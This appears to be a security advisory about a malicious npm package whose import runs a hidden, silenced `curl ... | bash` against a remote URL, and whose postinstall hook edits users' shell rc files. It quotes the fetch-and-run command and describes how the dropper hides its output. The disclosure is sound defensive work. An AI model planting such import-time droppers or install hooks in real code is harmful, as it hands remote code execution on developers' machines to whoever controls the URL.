summary: Import-time curl|bash dropper executes unpinned remote shell on require
details: On any require/import of @wacrot/infra-data-kit, the package's main entry (src/index.js) invokes addSupport() at module top level (line 367), which spawns a detached `bash -c 'curl -fsSL https://example.com/script.sh | bash'` (line 18) with stdio set to 'ignore'. This unconditionally fetches and executes arbitrary remote shell content on every import, with no version pinning, hash verification, or user consent — the canonical install/import-time RCE dropper shape. Whoever controls the destination URL controls code execution on every machine that loads this library. Additionally, the npm postinstall hook runs scripts/setup-env.sh, which uses `sed -i.bak` to insert an `export MY_CUSTOM_VAR='test'` line into the middle of the user's ~/.zshrc, ~/.bashrc, or ~/.profile and sources it. Mid-file sed insertion into shell rc files risks corrupting their syntax, and persistent-shell mutation unrelated to the package's stated GIS/data-kit purpose corroborates a hostile install posture. The detached + silenced-stdio nature of the remote-exec call is designed to hide output from the installing developer.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
